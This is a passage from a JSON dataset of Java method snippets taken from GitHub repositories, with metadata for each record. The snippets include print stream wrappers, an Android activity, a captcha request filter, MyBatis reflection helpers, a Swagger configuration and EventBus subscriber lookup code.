print(final float f) {\n      write(String.valueOf(f));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32424, "method_name": "println", "class_name": "LogStream", "params": ["char"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void println(final char c) {\n      print(c);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32425, "method_name": "print", "class_name": "LogStream", "params": ["char"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void print(final char c) {\n      write(String.valueOf(c));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32426, "method_name": "println", "class_name": "LogStream", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void println(final long l) {\n      print(l);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32427, "method_name": "print", "class_name": "LogStream", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void print(final long l) {\n      write(String.valueOf(l));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32428, "method_name": "println", "class_name": "LogStream", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void println(final double d) {\n      print(d);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32429, "method_name": "print", "class_name": "LogStream", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void print(final double d) {\n      write(String.valueOf(d));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32430, "method_name": "println", "class_name": "LogStream", "params": ["char"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void println(final char[] c) {\n      print(c);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32431, "method_name": "print", "class_name": "LogStream", "params": ["char"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void print(final char[] c) {\n      write(new String(c));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32432, "method_name": "println", "class_name": "LogStream", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void println(final Object o) {\n      print(o);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32433, "method_name": "print", "class_name": "LogStream", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void print(final Object o) {\n      write(o.toString());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32434, "method_name": "onCreate", "class_name": "MyProjectsActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_my_projects);\n        findViews();\n        initLogic();\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/activity/MyProjectsActivity.java", "stars": "4", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32435, "method_name": "findViews", "class_name": "MyProjectsActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void findViews () {\n        viewPager = findViewById(R.id.viewPager);\n        tabLayout = findViewById(R.id.tabLayout);\n        toolbar = findViewById(R.id.toolbar);\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/activity/MyProjectsActivity.java", "stars": "4", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32436, "method_name": "initLogic", "class_name": "MyProjectsActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initLogic () {\n        setSupportActionBar(toolbar);\n        toolbar.setNavigationOnClickListener(v -> finish());\n        initViewPager();\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/activity/MyProjectsActivity.java", "stars": "4", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32437, "method_name": "initViewPager", "class_name": "MyProjectsActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initViewPager () {\n        viewPager.setAdapter(new MyProjectsAdapter(getSupportFragmentManager(), getApplicationContext()));\n        tabLayout.setupWithViewPager(viewPager);\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/activity/MyProjectsActivity.java", "stars": "4", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32438, "method_name": "run", "class_name": "Byd", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        System.out.println(\"\u6bd4\u4e9a\u8fea\u5728\u516c\u8def\u4e0a\u884c\u9a76\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/simplefactory/Byd.java", "stars": "2", "class_props": {"extends": "Car", "implements": null, "modifiers": ["public"]}}, {"id": 32439, "method_name": "doFilterInternal", "class_name": "ValidateCodeFilter", "params": ["HttpServletRequest", "HttpServletResponse", "FilterChain"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) {\n        boolean match = securityProperties.getValidateCodeUrls()\n                .stream()\n                .anyMatch(requestMatcher -> new AntPathRequestMatcher(requestMatcher).matches(request));\n\n        if (match) {\n            String key = request.getParameter(\"key\");\n            String code = request.getParameter(\"code\");\n            boolean b = ValidateCodeUtil.verifyCaptcha(key, code);\n            if (!b) {\n                SecurityUtil.writeToResponse(R.err(HttpStatus.HTTP_UNAUTHORIZED, \"\u9a8c\u8bc1\u7801\u9519\u8bef\"), response);\n                return;\n            }\n        }\n        filterChain.doFilter(request, response);\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/filter/ValidateCodeFilter.java", "stars": "6", "class_props": {"extends": "OncePerRequestFilter", "implements": null, "modifiers": ["public"]}}, {"id": 32440, "method_name": "forObject", "class_name": "MetaObject", "params": ["Object", "ObjectFactory", "ObjectWrapperFactory", "ReflectorFactory"], "throws": null, "modifiers": ["public", "static"], "return_type": "MetaObject", "snippet": "  public static MetaObject forObject(Object object, ObjectFactory objectFactory, ObjectWrapperFactory objectWrapperFactory, ReflectorFactory reflectorFactory) {\n    if (object == null) {\n      return SystemMetaObject.NULL_META_OBJECT;\n    } else {\n      return new MetaObject(object, objectFactory, objectWrapperFactory, reflectorFactory);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32441, "method_name": "getObjectFactory", "class_name": "MetaObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ObjectFactory", "snippet": "  public ObjectFactory getObjectFactory() {\n    return objectFactory;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32442, "method_name": "getObjectWrapperFactory", "class_name": "MetaObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ObjectWrapperFactory", "snippet": "  public ObjectWrapperFactory getObjectWrapperFactory() {\n    return objectWrapperFactory;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32443, "method_name": "getReflectorFactory", "class_name": "MetaObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ReflectorFactory", "snippet": "  public ReflectorFactory getReflectorFactory() {\n    return reflectorFactory;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32444, "method_name": "getOriginalObject", "class_name": "MetaObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getOriginalObject() {\n    return originalObject;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32445, "method_name": "findProperty", "class_name": "MetaObject", "params": ["String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String findProperty(String propName, boolean useCamelCaseMapping) {\n    return objectWrapper.findProperty(propName, useCamelCaseMapping);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32446, "method_name": "getGetterNames", "class_name": "MetaObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getGetterNames() {\n    return objectWrapper.getGetterNames();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32447, "method_name": "getSetterNames", "class_name": "MetaObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getSetterNames() {\n    return objectWrapper.getSetterNames();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32448, "method_name": "getSetterType", "class_name": "MetaObject", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> getSetterType(String name) {\n    return objectWrapper.getSetterType(name);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32449, "method_name": "getGetterType", "class_name": "MetaObject", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> getGetterType(String name) {\n    return objectWrapper.getGetterType(name);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32450, "method_name": "hasSetter", "class_name": "MetaObject", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasSetter(String name) {\n    return objectWrapper.hasSetter(name);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32451, "method_name": "hasGetter", "class_name": "MetaObject", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasGetter(String name) {\n    return objectWrapper.hasGetter(name);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32452, "method_name": "getValue", "class_name": "MetaObject", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getValue(String name) {\n    PropertyTokenizer prop = new PropertyTokenizer(name);\n    if (prop.hasNext()) {\n      MetaObject metaValue = metaObjectForProperty(prop.getIndexedName());\n      if (metaValue == SystemMetaObject.NULL_META_OBJECT) {\n        return null;\n      } else {\n        return metaValue.getValue(prop.getChildren());\n      }\n    } else {\n      return objectWrapper.get(prop);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32453, "method_name": "setValue", "class_name": "MetaObject", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setValue(String name, Object value) {\n    PropertyTokenizer prop = new PropertyTokenizer(name);\n    if (prop.hasNext()) {\n      MetaObject metaValue = metaObjectForProperty(prop.getIndexedName());\n      if (metaValue == SystemMetaObject.NULL_META_OBJECT) {\n        if (value == null) {\n          // don't instantiate child path if value is null\n          return;\n        } else {\n          metaValue = objectWrapper.instantiatePropertyValue(name, prop, objectFactory);\n        }\n      }\n      metaValue.setValue(prop.getChildren(), value);\n    } else {\n      objectWrapper.set(prop, value);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32454, "method_name": "metaObjectForProperty", "class_name": "MetaObject", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "MetaObject", "snippet": "  public MetaObject metaObjectForProperty(String name) {\n    Object value = getValue(name);\n    return MetaObject.forObject(value, objectFactory, objectWrapperFactory, reflectorFactory);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32455, "method_name": "getObjectWrapper", "class_name": "MetaObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ObjectWrapper", "snippet": "  public ObjectWrapper getObjectWrapper() {\n    return objectWrapper;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32456, "method_name": "isCollection", "class_name": "MetaObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isCollection() {\n    return objectWrapper.isCollection();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32457, "method_name": "add", "class_name": "MetaObject", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void add(Object element) {\n    objectWrapper.add(element);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32458, "method_name": "addAll", "class_name": "MetaObject", "params": ["List<E>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public <E> void addAll(List<E> list) {\n    objectWrapper.addAll(list);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32459, "method_name": "apiInfo", "class_name": "SwaggerDocumentationConfig", "params": [], "throws": null, "modifiers": [], "return_type": "ApiInfo", "snippet": "    ApiInfo apiInfo() {\n        return new ApiInfoBuilder()\n            .title(\"User Administration API\")\n            .description(\"## API of User Administration Services  This specification describes the endpoints, request/response model of the User Administration API. This API provides REST resources to manage musics of Music Hoster application.\")\n            .license(\"\")\n            .licenseUrl(\"http://unlicense.org\")\n            .termsOfServiceUrl(\"\")\n            .version(\"1.0.0\")\n            .contact(new Contact(\"\",\"\", \"\"))\n            .build();\n    }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/io/swagger/configuration/SwaggerDocumentationConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32460, "method_name": "customImplementation", "class_name": "SwaggerDocumentationConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Docket", "snippet": "    public Docket customImplementation(){\n        return new Docket(DocumentationType.SWAGGER_2)\n                .select()\n                    .apis(RequestHandlerSelectors.basePackage(\"io.swagger.api\"))\n                    .build()\n                .directModelSubstitute(java.time.LocalDate.class, java.sql.Date.class)\n                .directModelSubstitute(java.time.OffsetDateTime.class, java.util.Date.class)\n                .apiInfo(apiInfo());\n    }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/io/swagger/configuration/SwaggerDocumentationConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32461, "method_name": "findSubscriberMethods", "class_name": "SubscriberMethodFinder", "params": ["Class<?>"], "throws": null, "modifiers": [], "return_type": "List<SubscriberMethod>", "snippet": "    List<SubscriberMethod> findSubscriberMethods(Class<?> subscriberClass) {\n        List<SubscriberMethod> subscriberMethods = METHOD_CACHE.get(subscriberClass);\n        if (subscriberMethods != null) {\n            return subscriberMethods;\n        }\n\n        if (ignoreGeneratedIndex) {\n            subscriberMethods = findUsingReflection(subscriberClass);\n        } else {\n            subscriberMethods = findUsingInfo(subscriberClass);\n        }\n        if (subscriberMethods.isEmpty()) {\n            throw new EventBusException(\"Subscriber \" + subscriberClass\n                    + \" and its super classes have no public methods with the @Subscribe annotation\");\n        } else {\n            METHOD_CACHE.put(subscriberClass, subscriberMethods);\n            return subscriberMethods;\n        }\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32462, "method_name": "findUsingInfo", "class_name": "SubscriberMethodFinder", "params": ["Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "List<SubscriberMethod>", "snippet": "    private List<SubscriberMethod> findUsingInfo(Class<?> subscriberClass) {\n        FindState findState = prepareFindState();\n        findState.initForSubscriber(subscriberClass);\n        while (findState.clazz != null) {\n            findState.subscriberInfo = getSubscriberInfo(findState);\n            if (findState.subscriberInfo != null) {\n                SubscriberMethod[] array = findState.subscriberInfo.getSubscriberMethods();\n                for (SubscriberMethod subscriberMethod : array) {\n                    if (findState.checkAdd(subscriberMethod.method, subscriberMethod.eventType)) {\n                        findState.subscriberMethods.add(subscriberMethod);\n                    }\n                }\n            } else {\n                findUsingReflectionInSingleClass(findState);\n            }\n            findState.moveToSuperclass();\n        }\n        return getMethodsAndRelease(findState);\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32463, "method_name": "getMethodsAndRelease", "class_name": "SubscriberMethodFinder", "params": ["FindState"], "throws": null, "modifiers": ["private"], "return_type": "List<SubscriberMethod>", "snippet": "    private List<SubscriberMethod> getMethodsAndRelease(FindState findState) {\n        List<SubscriberMethod> subscriberMethods = new ArrayList<>(findState.subscriberMethods);\n        findState.recycle();\n        synchronized (FIND_STATE_POOL) {\n            for (int i = 0; i < POOL_SIZE; i++) {\n                if (FIND_STATE_POOL[i] == null) {\n                    FIND_STATE_POOL[i] = findState;\n                    break;\n                }\n            }\n        }\n        return subscriberMethods;\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32464, "method_name": "prepareFindState", "class_name": "SubscriberMethodFinder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "FindState", "snippet": "    private FindState prepareFindState() {\n        synchronized (FIND_STATE_POOL) {\n            for (int i = 0; i < POOL_SIZE; i++) {\n                FindState state = FIND_STATE_POOL[i];\n                if (state != null) {\n                    FIND_STATE_POOL[i] = null;\n                    return state;\n                }\n            }\n        }\n        return new FindState();\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32465, "method_name": "getSubscriberInfo", "class_name": "SubscriberMethodFinder", "params": ["FindState"], "throws": null, "modifiers": ["private"], "return_type": "SubscriberInfo", "snippet": "    private SubscriberInfo getSubscriberInfo(FindState findState) {\n        if (findState.subscriberInfo != null && findState.subscriberInfo.getSuperSubscriberInfo() != null) {\n            SubscriberInfo superclassInfo = findState.subscriberInfo.getSuperSubscriberInfo();\n            if (findState.clazz == superclassInfo.getSubscriberClass()) {\n                return superclassInfo;\n            }\n        }\n        if (subscriberInfoIndexes != null) {\n            for (SubscriberInfoIndex index : subscriberInfoIndexes) {\n                SubscriberInfo info = index.getSubscriberInfo(findState.clazz);\n                if (info != null) {\n                    return info;\n                }\n            }\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32466, "method_name": "findUsingReflection", "class_name": "SubscriberMethodFinder", "params": ["Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "List<SubscriberMethod>", "snippet": "    private List<SubscriberMethod> findUsingReflection(Class<?> subscriberClass) {\n        FindState findState = prepareFindState();\n        findState.initForSubscriber(subscriberClass);\n        while (findState.clazz != null) {\n            findUsingReflectionInSingleClass(findState);\n            findState.moveToSuperclass();\n        }\n        return getMethodsAndRelease(findState);\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32467, "method_name": "findUsingReflectionInSingleClass", "class_name": "SubscriberMethodFinder", "params": ["FindState"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void findUsingReflectionInSingleClass(FindState findState) {\n        Method[] methods;\n        try {\n            // This is faster than getMethods, especially when subscribers are fat classes like Activities\n            methods = findState.clazz.getDeclaredMethods();\n        } catch (Throwable th) {\n            // Workaround for java.lang.NoClassDefFoundError, see https://github.com/greenrobot/EventBus/issues/149\n            methods = findState.clazz.getMethods();\n            findState.skipSuperClasses = true;\n        }\n        for (Method method : methods) {\n            method.setAccessible(true);\n            int modifiers = method.getModifiers();\n//            if ((modifiers & Modifier.PUBLIC) != 0 && (modifiers & MODIFIERS_IGNORE) == 0) {\n                Class<?>[] parameterTypes = method.getParameterTypes();\n                if (parameterTypes.length == 1) {\n                    Subscribe subscribeAnnotation = method.getAnnotation(Subscribe.class);\n                    if (subscribeAnnotation != null) {\n                        Class<?> eventType = parameterTypes[0];\n                        if (findState.checkAdd(method, eventType)) {\n                            ThreadMode threadMode = subscribeAnnotation.threadMode();\n                            findState.subscriberMethods.add(new SubscriberMethod(method, eventType, threadMode,\n                                    subscribeAnnotation.priority(), subscribeAnnotation.sticky(),subscribeAnnotation.event(),subscribeAnnotation.enback()));\n                        }\n                    }\n                } else if (strictMethodVerification && method.isAnnotationPresent(Subscribe.class)) {\n                    String methodName = method.getDeclaringClass().getName() + \".\" + method.getName();\n                    throw new EventBusException(\"@Subscribe method \" + methodName +\n                            \"must have exactly 1 parameter but has \" + parameterTypes.length);\n                }\n//            } else if (strictMethodVerification && method.isAnnotationPresent(Subscribe.class)) {\n//                String methodName = method.getDeclaringClass().getName() + \".\" + method.getName();\n//                throw new EventBusException(methodName +\n//                        \" is a illegal @Subscribe method: must be public, non-static, and non-abstract\");\n//            }\n        }\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32468, "method_name": "clearCaches", "class_name": "SubscriberMethodFinder", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void clearCaches() {\n        METHOD_CACHE.clear();\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32469, "method_name": "initForSubscriber", "class_name": "FindState", "params": ["Class<?>"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "        void initForSubscriber(Class<?> subscriberClass) {\n            this.subscriberClass = clazz = subscriberClass;\n            skipSuperClasses = false;\n            subscriberInfo = null;\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 32470, "method_name": "recycle", "class_name": "FindState", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "        void recycle() {\n            subscriberMethods.clear();\n            anyMethodByEventType.clear();\n            subscriberClassByMethodKey.clear();\n            methodKeyBuilder.setLength(0);\n            subscriberClass = null;\n            clazz = null;\n            skipSuperClasses = false;\n            subscriberInfo = null;\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 32471, "method_name": "checkAdd", "class_name": "FindState", "params": ["Method", "Class<?>"], "throws": null, "modifiers": [], "return_type": "boolean", "snippet": "        boolean checkAdd(Method method, Class<?> eventType) {\n            // 2 level check: 1st level with event type only (fast), 2nd level with complete signature when required.\n            // Usually a subscriber doesn't have methods listening to the same event type.\n            Object existing = anyMethodByEventType.put(eventType, method);\n            if (existing == null) {\n                return true;\n            } else {\n                if (existing instanceof Method) {\n                    if (!checkAddWithMethodSignature((Method) existing, eventType)) {\n                        // Paranoia check\n                        throw new IllegalStateException();\n                    }\n                    // Put any non-Method object to \"consume\" the existing Method\n                    anyMethodByEventType.put(eventType, this);\n                }\n                return checkAddWithMethodSignature(method, eventType);\n            }\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 32472, "method_name": "checkAddWithMethodSignature", "class_name": "FindState", "params": ["Method", "Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "        private boolean checkAddWithMethodSignature(Method method, Class<?> eventType) {\n            methodKeyBuilder.setLength(0);\n            methodKeyBuilder.append(method.getName());\n            methodKeyBuilder.append('>').append(eventType.getName());\n\n            String methodKey = methodKeyBuilder.toString();\n            Class<?> methodClass = method.getDeclaringClass();\n            Class<?> methodClassOld = subscriberClassByMethodKey.put(methodKey, methodClass);\n            if (methodClassOld == null || methodClassOld.isAssignableFrom(methodClass)) {\n                // Only add if not already found in a sub class\n                return true;\n            } else {\n                // Revert the put, old class is further down the class hierarchy\n                subscriberClassByMethodKey.put(methodKey, methodClassOld);\n                return false;\n            }\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/SubscriberMethodFinder.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 32473, "method_name": "moveToSuperclass", "class_name": "FindState", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "        void moveToSuperclass() {\n            if (skipSuperClasses) {\n                clazz = null;\n            } else {\n                clazz = 